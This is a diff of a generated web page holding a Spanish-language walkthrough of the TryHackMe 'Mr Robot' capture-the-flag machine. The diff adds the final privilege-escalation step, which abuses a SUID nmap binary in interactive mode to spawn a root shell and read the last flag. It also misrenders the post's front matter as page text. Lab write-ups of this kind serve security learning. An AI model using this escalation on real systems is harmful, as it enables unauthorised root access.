@@ -9,23 +9,21 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>tryhackme: Mr Robot - Pentester - Ctf’s</title>
-<meta name="description" content="El mejor metodo de aprendizaje es practicando">
+<!-- begin _includes/seo.html --><title>Mrrobot - Pentester - Ctf&#8217;s</title>
+<meta name="description" content="title: “tryhackme: Mr Robot”share: falseexcerpt: “El mejor metodo de aprendizaje es practicando”share: falseheader:  teaser:  /assets/images/MrRobot/logo.jpg  teaser_home_page: truecategories:  tryhackmetags:  web      wordpress  ">
 
 
 
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Pentester - Ctf's">
-<meta property="og:title" content="tryhackme: Mr Robot">
+<meta property="og:title" content="Mrrobot">
 <meta property="og:url" content="http://localhost:4000/MrRobot/">
 
 
-  <meta property="og:description" content="El mejor metodo de aprendizaje es practicando">
+  <meta property="og:description" content="title: “tryhackme: Mr Robot”share: falseexcerpt: “El mejor metodo de aprendizaje es practicando”share: falseheader:  teaser:  /assets/images/MrRobot/logo.jpg  teaser_home_page: truecategories:  tryhackmetags:  web      wordpress  ">
 
 
-
-  <meta property="og:image" content="http://localhost:4000/assets/images/MrRobot/logo.jpg">
 
 
 
@@ -162,7 +160,7 @@
         <span class="sep">/</span>
       
       
-        <li class="current">tryhackme: Mr Robot</li>
+        <li class="current">Mrrobot</li>
       
     
   </ol>
@@ -302,15 +300,15 @@
 
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="tryhackme: Mr Robot">
-    <meta itemprop="description" content="El mejor metodo de aprendizaje es practicando">
+    <meta itemprop="headline" content="Mrrobot">
+    <meta itemprop="description" content="title: “tryhackme: Mr Robot”share: falseexcerpt: “El mejor metodo de aprendizaje es practicando”share: falseheader:  teaser:  /assets/images/MrRobot/logo.jpg  teaser_home_page: truecategories:  tryhackmetags:  web      wordpress  ">
     <meta itemprop="datePublished" content="November 01, 2021">
     
 
     <div class="page__inner-wrap">
       
         <header>
-          <h1 id="page-title" class="page__title" itemprop="headline">tryhackme: Mr Robot
+          <h1 id="page-title" class="page__title" itemprop="headline">Mrrobot
 </h1>
           
         </header>
@@ -324,7 +322,25 @@
           
           
         </p>
-        <h1 id="comprobaremos-que-la-maquina-se-encuentre-activa">Comprobaremos que la maquina se encuentre activa</h1>
+        
+<p>title: “tryhackme: Mr Robot”
+share: false
+excerpt: “El mejor metodo de aprendizaje es practicando”
+share: false
+header:
+  teaser:  /assets/images/MrRobot/logo.jpg
+  teaser_home_page: true
+categories:</p>
+<ul>
+  <li>tryhackme
+tags:</li>
+  <li>web</li>
+  <li>
+    <h2 id="wordpress">wordpress</h2>
+  </li>
+</ul>
+
+<h1 id="comprobaremos-que-la-maquina-se-encuentre-activa">Comprobaremos que la maquina se encuentre activa</h1>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.115.49
 PING 10.10.115.49 <span class="o">(</span>10.10.115.49<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
@@ -549,54 +565,36 @@ robot@linux:~<span class="nv">$ </span><span class="nb">cat </span>ke<span class
 <p>llama la atención que <em>nmap</em> tenga privilegios SUID, probar usar <a href="https://gtfobins.github.io/gtfobins/nmap/#suid">gtfobis</a> 
 para abusar de dichos privilegios</p>
 
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:~<span class="nv">$ </span>/usr/local/bin/nmap <span class="nt">--interactive</span>
+/usr/local/bin/nmap <span class="nt">--interactive</span>
+
+Starting nmap V. 3.81 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
+Welcome to Interactive Mode <span class="nt">--</span> press h &lt;enter&gt; <span class="k">for </span><span class="nb">help
+</span>nmap&gt; <span class="o">!</span>sh
+<span class="o">!</span>sh
+<span class="c"># id</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>robot<span class="o">)</span>
+</code></pre></div></div>
+<p>ya somos usuarios <em>root</em>, solo nos queda encontrar la <em>flag</em> para completar la maquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cd root</span>
+<span class="nb">cd </span>root
+<span class="c"># ls</span>
+<span class="nb">ls
+</span>firstboot_done	key-3-of-3.txt
+<span class="c"># cat key-3-of-3.txt</span>
+<span class="nb">cat </span>key-3-of-3.txt
+x4x8xxxef27x3dee1ex161bx1x7xbxe4
+</code></pre></div></div>
+<h2 id="maquina-terminada">Maquina terminada</h2>
+
         
       </section>
 
       <footer class="page__meta">
         
         
-  
-
-
-  
-  
-  
-
-  <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
-    <span itemprop="keywords">
-    
-      
-      
-      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a><span class="sep">, </span>
-    
-      
-      
-      <a href="/tags/#wordpress" class="page__taxonomy-item" rel="tag">wordpress</a>
-    
-    </span>
-  </p>
-
-
-
-
-  
-
-
-  
-  
-  
-
-  <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
-    <span itemprop="keywords">
-    
-      
-      
-      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">tryhackme</a>
-    
-    </span>
-  </p>
 
 
         
